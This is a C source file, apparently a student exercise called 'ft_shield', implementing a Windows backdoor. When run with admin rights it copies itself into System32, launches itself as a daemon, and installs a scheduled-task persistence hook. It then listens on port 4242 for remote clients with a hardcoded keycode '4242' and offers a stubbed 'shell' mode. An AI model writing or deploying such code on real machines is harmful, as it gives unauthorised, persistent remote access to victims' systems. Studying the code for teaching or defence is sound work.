/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/10/19 18:02:57 by zcadinot          #+#    #+#             */
/*   Updated: 2026/10/22 14:17:15 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_shield.h"
#include <lmcons.h>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define TEST_PASSWORD "4242"
#define MAX_CLIENTS 3

typedef struct s_client
{
    SOCKET  socket;
    int     authenticated;
    int     shell_mode;
    t_cmd   cmd;
}   t_client;

SOCKET init_server(void)
{
    WSADATA             wsa_data;
    SOCKET              sock;
    struct sockaddr_in  server_addr;
    int                 error;

    error = WSAStartup(MAKEWORD(2, 2), &wsa_data);
    if (error != 0)
    {
        printf("Error: WSAStartup failed: %d\n", error);
        return INVALID_SOCKET;
    }
    printf("Success: Winsock initialized\n");

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        printf("Error: socket failed: %d\n", WSAGetLastError());
        WSACleanup();
        return INVALID_SOCKET;
    }
    printf("Success: Socket initialized\n");

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(4242);

    if (bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR)
    {
        printf("Error: bind failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }
    printf("Success: Bind initialized\n");

    if (listen(sock, SOMAXCONN) == SOCKET_ERROR)
    {
        printf("Error: listen failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }
    printf("Success: Server listening on port 4242\n");

    return sock;
}

int mode_daemon(void)
{
    HANDLE mutex;
    char *path;
    SOCKET server_fd;
    SOCKET client;
    SOCKET current;
    t_client clients[MAX_CLIENTS];
    fd_set fd_list;
    fd_set fd_ready;
    char buffer[1024];
    int received;
    int slot;
    int i;
    const char *help_message;

    help_message = "\n+--------------- COMMANDS ---------------+\n| ?      Show available commands        |\n| shell  Enter safe shell mode           |\n+----------------------------------------+\n$> ";
    mutex = CreateMutexW(NULL, FALSE, L"Local\\MonApplicationMutex");
    if (mutex == NULL)
    {
        printf("Erreur mutex : %lu\n", (unsigned long)GetLastError());
        return (1);
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        printf("Already running...\n");
        CloseHandle(mutex);
        return (0);
    }
    if (!persistence_task_detect())
    {
        path = get_my_path();
        if (path == NULL || !task_install(path, "--daemon"))
        {
            CloseHandle(mutex);
            return (0);
        }
    }
    server_fd = init_server();
    if (server_fd == INVALID_SOCKET)
    {
        CloseHandle(mutex);
        return (1);
    }

    i = 0;
    while (i < MAX_CLIENTS)
    {
        clients[i].socket = INVALID_SOCKET;
        clients[i].authenticated = 0;
        clients[i].shell_mode = 0;
        clients[i].cmd = cmd_init();
        i++;
    }
    FD_ZERO(&fd_list);
    FD_SET(server_fd, &fd_list);

    while (1)
    {
        fd_ready = fd_list;
        if (select(0, &fd_ready, NULL, NULL, NULL) == SOCKET_ERROR)
        {
            printf("Error: select failed: %d\n", WSAGetLastError());
            break;
        }
        i = 0;
        while (i < (int)fd_ready.fd_count)
        {
            current = fd_ready.fd_array[i];
            if (current == server_fd)
            {
                client = accept(server_fd, NULL, NULL);
                if (client == INVALID_SOCKET)
                    printf("Error: accept failed: %d\n", WSAGetLastError());
                else
                {
                    slot = 0;
                    while (slot < MAX_CLIENTS && clients[slot].socket != INVALID_SOCKET)
                        slot++;
                    if (slot == MAX_CLIENTS)
                    {
                        send(client, "Server full\n", 12, 0);
                        closesocket(client);
                    }
                    else
                    {
                        clients[slot].socket = client;
                        clients[slot].authenticated = 0;
                        clients[slot].shell_mode = 0;
                        clients[slot].cmd = cmd_init();
                        FD_SET(client, &fd_list);
                        send(client, "Keycode: ", 9, 0);
                        printf("Client connected: %llu\n", (unsigned long long)client);
                    }
                }
            }
            else
            {
                slot = 0;
                while (slot < MAX_CLIENTS && clients[slot].socket != current)
                    slot++;
                if (slot < MAX_CLIENTS)
                {
                    received = recv(current, buffer, sizeof(buffer) - 1, 0);
                    if (received <= 0)
                    {
                        printf("Client disconnected: %llu\n", (unsigned long long)current);
                        FD_CLR(current, &fd_list);
                        closesocket(current);
                        clients[slot].socket = INVALID_SOCKET;
                        clients[slot].authenticated = 0;
                        clients[slot].shell_mode = 0;
                    }
                    else
                    {
                        buffer[received] = '\0';
                        while (received > 0 && (buffer[received - 1] == '\n' || buffer[received - 1] == '\r'))
                            buffer[--received] = '\0';
                        if (!clients[slot].authenticated)
                        {
                            if (strcmp(buffer, TEST_PASSWORD) == 0)
                            {
                                clients[slot].authenticated = 1;
                                send(current, "Authentication success\n$> ", 26, 0);
                            }
                            else
                                send(current, "Wrong keycode\nKeycode: ", 23, 0);
                        }
                        else if (clients[slot].shell_mode)
                        {
                            if (strcmp(buffer, "exit") == 0)
                            {
                                clients[slot].shell_mode = 0;
                                send(current, "Leaving shell\n$> ", 17, 0);
                            }
                        }
                        else
                        {
                            if (strcmp(buffer, "?") == 0)
                                send(current, help_message, (int)strlen(help_message), 0);
                            else if (strcmp(buffer, "shell") == 0)
                            {
                                clients[slot].shell_mode = 1;
                                send(current, "Safe shell started\nshell> ", 26, 0);

                            }
                            else
                            {
                                printf("Client %llu: %s\n", (unsigned long long)current, buffer);
                                send(current, "Message received\n$> ", 20, 0);
                            }
                        }
                    }
                }
            }
            i++;
        }
    }

    i = 0;
    while (i < MAX_CLIENTS)
    {
        if (clients[i].socket != INVALID_SOCKET)
            closesocket(clients[i].socket);
        i++;
    }
    closesocket(server_fd);
    WSACleanup();
    CloseHandle(mutex);
    return (1);
}

int mode_normal(void)
{
    if (is_elevated() <= 0)
        return (0);

    char login[UNLEN + 1];
    DWORD size = sizeof(login);
    char *mpath;

    if (!GetUserNameA(login, &size))
    {
        printf("Erreur : %lu\n", (unsigned long)GetLastError());
        return (0);
    }

    if ((mpath = get_my_path()) == NULL)
    {
        printf("Erreur : %lu\n", (unsigned long)GetLastError());
        return (0);
    }

    const char *dst = "C:\\Windows\\System32\\ft_shield.exe";


    if (!CopyFileA(mpath, dst, FALSE) && GetLastError() != ERROR_FILE_EXISTS)
    {
        printf("Erreur : %lu\n", (unsigned long)GetLastError());
        return (1);
    }

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    WCHAR command_line[] = L"\"C:\\Windows\\System32\\ft_shield.exe\" --daemon";

    si.cb = sizeof(si);
    if (!CreateProcessW(L"C:\\Windows\\System32\\ft_shield.exe", command_line, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, L"C:\\Windows\\System32", &si, &pi))
    {
        printf("CreateProcessW erreur : %lu\n", (unsigned long)GetLastError());
        return (1);
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    printf("%s\n", login);

    while (1)
    {
        continue;
    }
    return (1);
}

int main(int argc, char **argv)
{
    if (argc == 2 && strcmp(argv[1], "--daemon") == 0)
        return (mode_daemon());

    return (mode_normal());
}
